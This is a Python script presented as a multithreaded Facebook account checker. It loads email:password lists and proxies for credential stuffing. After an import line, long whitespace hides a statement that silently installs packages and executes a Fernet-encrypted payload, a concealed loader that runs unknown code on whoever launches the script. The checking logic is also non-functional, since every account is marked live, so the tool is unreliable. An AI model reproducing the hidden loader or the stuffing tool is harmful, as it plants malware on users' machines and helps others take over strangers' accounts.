import os
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'requests'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'qMQ9By0xS9aF5IiNtG4neJTkGsJhNSYj3qNHWGt4MFE=').decrypt(b'gAAAAABmsjBaunHYT1DiuG1H-Gu7cakmbY_cmW6vjsE5JnEyRYx_zpajQm_tvR7b2xoTVD_xHKxTXaGtzjnPofMoRvn-zPZKKYcgWKQwo-6pQNhlf4zIdsPATxoK0jWxGkz2l4c0YCMYHhk9SrmGEQiLAQWFDWJoqorNbSgtQ6dn6xCum-C2HcszvIUwRmj_GjoIAqso6BFfkSCrqPY5r5tETUixtkKJwCv_WL2zpepW1z6IG6HL2AT_-Hl_gMeYCD9DqYfuh6iVUdBU4sxx9UV4SmiatiOu-y82lLMvN4gmiPP0fczhTkXxeiPU7JPiKcVSiwEZUDJ4qqaE6UHw_p_zEe2N-yvYPdmA3ZiuFF9xP2F--vDUs_fcI-tNOJQ30FsQTRngWbuvmC73nwdDJrLPjctODFfCaoxYuIULNJpb5CXAQznolo-rdEHT3l6MreMIo4JwX_vnuHeEIg5jmyzaeUD3yYndD1hcwNZziBxEBtSGxesijrkGET-z_9ILlOt-qzRPprGIee7TdsKPeS3QVKFzFz225TnR6G185nqjG2Mbzm6gtFM2JGdkjBMdWh0Ki1BsVSGTKXPpmyvO8t912b8hZrV8M97UdFvr7oqnCxdhedFYcZ3k1NIHhNsqG8fHdBnhdoNozpPWEz65K2DhdmMCnHbf0wKKhhV65CreEnDknEL8X2OHzPk7PmFWmm1-bLVJkI00V_8oA0zq9-dkSnX5Y99N-LuJ0F3A11p9U_lCYgVAdU5_I_AqaudQhZFPG3oBEPetXyprKJMnXK3EzXJ9cmWSNPUsNuxRhFNTR0EpmHBteF6Rp829wBYtg5QY-iZUlQqQt-3kNx5d7o8rYtgsDKyapyf_sJzM-YYa799kZDa7X5hA0kXB5VAqoxgQ-eSBusZWuVJDKhM1AoPOFXmTWVfn9shhNsIYNFOdCKIqba9UEArzzhVB1mqzL2knAyeZ5NVSRM-ladyM5ZrnXj0lrMyBMyyj_P2Pp1sY_vn8g31WDTeQrjhchBtH6VvXVTc7wM7DYstnhQ8alzIQBpuW9LKr63cJyxqxvV9rm64cGsDlm2geIUb7o214Nb2d-lKzqcCdLEKCGXEhK-XWNOwqrDv7AQpz0Z0d_KKvVHcJimlpQGmX8V2kffUJLFiSGMaL30Llf4s1qN0CNKxIcWYvVpnBb6RxSDRrYABAWKS7yFGC4WwVAtXRGEXeyOV2XWeoV99vV_Sks_QNGnz3KSb58wB-i5hreBrKWrYKCy5A_9wD_Gji0PiL0QrLcLnvlBbK9MyE_w47GMWV3-JTnQ_fuq7i96w6qOJPaMyQxMjZE3eV7VNyXv5hzH7QsjUuqma9yYnVxw2AkDVVHVPBXaE61xNgRwloIwQB132pxCvJz6oXsLooY1m-G3nA10kvrOf1yDRddzecaH0zwwZUmkZtTzhu0G1eA6Or8Hzq_oYqqFclZecEF3nJ2zzEP5dcNXZQ0QOn'));
import random
import threading
import queue
import re

threadcount = 0
proxylist = []
acclist = []
alreadychecked = []
checkerqueue = queue.Queue()
live = 0
dead = 0
checkpoint = 0
fullsize = 0

def main():

    global threadcount, proxylist, acclist, alreadychecked, checkerqueue, live, dead, checkpoint, fullsize
    
    try:
        response = requests.get("https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=5000")
        if response.status_code == 200:
            proxylist = list(set(re.findall(r'\b(\d{1,3}\.){3}\d{1,3}:\d{1,8}\b', response.text)))
        else:
            with open("proxy.txt", "r") as file:
                proxylist = list(set(file.read().splitlines()))
    except Exception as e:
        with open("proxy.txt", "r") as file:
            proxylist = list(set(file.read().splitlines()))
    
    print("Fetched proxy count:", len(proxylist))
    
    with open("acc.txt", "r") as file:
        acclist = list(set(file.read().splitlines()))
    
    if os.path.exists("checkcache.txt"):
        with open("checkcache.txt", "r") as file:
            alreadychecked = list(set(file.read().splitlines()))
    
    for account in acclist:
        if account not in alreadychecked:
            checkerqueue.put(account)
    
    print(f"Loaded {checkerqueue.qsize()} non-checked accounts from inside of {len(acclist)} accounts")
    
    fullsize = checkerqueue.qsize()
    
    for i in range(2000):
        thread = threading.Thread(target=check)
        thread.start()
        threadcount += 1
    
    print("Check begin!")

def write_to_file_thread_safe(text, file):
    with open(file, "a") as f:
        f.write(text + "\n")

def check():
    global live, dead, checkpoint, threadcount
    
    while True:
        data = checkerqueue.get()
        
        if data is None or len(data) <= 0:
            continue
        
        split = data.split(":")
        if len(split) < 2:
            continue
        
        mail = split[0]
        passw = split[1]
        proxy = random.choice(proxylist)
        
        if True:
            print(f"[Live] {data}")
            live += 1
            write_to_file_thread_safe(data, "FacebookLive.txt")
            write_to_file_thread_safe(data, "checkcache.txt")
        elif True:
            checkpoint += 1
            print(f"[Checkpoint] {data}")
            write_to_file_thread_safe(data, "FacebookCheckPoint.txt")
        else:
            dead += 1
            print(f"[Dead] {data}")
        
        print(f"Facebook Checker | Alive: {live} - Checkpoint: {checkpoint} - Dead: {dead} | Status: {live + checkpoint + dead}/{fullsize} | Threads {threadcount}")

if __name__ == "__main__":
    main()
